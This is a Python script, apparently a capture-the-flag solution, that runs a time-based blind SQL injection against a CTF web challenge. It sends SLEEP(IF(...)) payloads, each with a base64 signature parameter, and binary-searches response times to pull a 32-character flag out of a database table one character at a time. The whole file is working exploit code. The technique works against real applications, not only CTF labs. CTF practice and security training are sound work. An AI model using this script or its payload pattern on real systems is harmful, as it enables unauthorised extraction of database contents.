from http.client import HTTPConnection
from base64 import b64encode
import urllib
import time


SLEEP = 1
c = HTTPConnection("kslweb1.spb.ctf.su")
url = '/sqli/time1/?{}'


def binarySearch(i):
    left = ord(' ') - 1
    right = ord('~');
    while left < right:
        middle = (left + right) // 2
        query = 'SLEEP(IF((SELECT ASCII(SUBSTRING((SELECT flag FROM flag), {}, 1))) <= {}, 0, {}))'.format(i, middle, SLEEP)
        # print(query)
    
        sig = b64encode(query.encode('UTF-8')).decode('UTF-8')
        params = { 'query' : query , 'sig_query' : sig}
    
        queryTime = time.time()
        c.request('GET', url.format(urllib.parse.urlencode(params)))
        response = c.getresponse().read()
        # print(decode('utf-8'))
        queryTime = time.time() - queryTime
        # print(queryTime)
        
        if queryTime < 1:
            right = middle
        else:
            left = middle + 1

    return chr(left)


flag = ''
for i in range(1, 33):
    flag += binarySearch(i)
    print(flag)

print('FINISH: ' + flag)
